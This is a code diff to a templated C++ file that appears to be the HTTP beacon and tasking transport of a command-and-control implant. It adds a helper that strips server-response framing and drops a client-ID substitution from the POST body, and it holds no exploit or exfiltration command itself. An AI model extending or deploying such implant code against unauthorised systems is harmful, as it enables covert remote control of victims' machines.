@@ -31,6 +31,30 @@ namespace [[ raw_profile_namespace ]] {
     }
 
     // ====================================================================
+    // Token Extraction Helper
+    // ====================================================================
+    // Strips the server body template framing from a response, returning only
+    // the data that replaced the token. Without this, reverse transforms would
+    // run on the entire response (including HTTP headers etc.) and fail.
+    inline std::string extract_token(const std::string& response, const std::string& templ, const std::string& token) {
+        size_t tok_pos = templ.find(token);
+        if (tok_pos == std::string::npos) {
+            return response;
+        }
+        std::string prefix = templ.substr(0, tok_pos);
+        std::string suffix = templ.substr(tok_pos + token.length());
+
+        size_t start = prefix.length();
+        size_t end = response.length() - suffix.length();
+
+        if (start > response.length() || end > response.length() || start > end) {
+            DEBUG_LOG("[extract_token] Response doesn't match template framing, returning raw");
+            return response;
+        }
+        return response.substr(start, end - start);
+    }
+
+    // ====================================================================
     // BEACON / TASKING (RAW GET)
     // ====================================================================
     inline std::vector<uint8_t> get(std::vector<uint8_t> metadata_as_msgpack) {
@@ -65,8 +89,9 @@ namespace [[ raw_profile_namespace ]] {
             return std::vector<uint8_t>{};
         }
 
-        // 4. Reverse Server Output Transforms
-        std::string response_body(raw_response.begin(), raw_response.end());
+        // 4. Strip server body template framing, then reverse transforms
+        std::string full_response(raw_response.begin(), raw_response.end());
+        std::string response_body = extract_token(full_response, "[[ get_server_body ]]", "<OUTPUT>");
 
         [% for step in get_server_transforms | reverse %]
             [% set t_obj = {'statement': step.op, 'value': step.val | default('')} %]
@@ -97,7 +122,6 @@ namespace [[ raw_profile_namespace ]] {
 
         // 2. Build Wire Payload
         std::string body = "[[ post_body ]]";
-        replace_token(body, "<CLIENT_ID>", implant_uuid);
         replace_token(body, "<OUTPUT>", payload);
 
         std::vector<uint8_t> wire_payload(body.begin(), body.end());
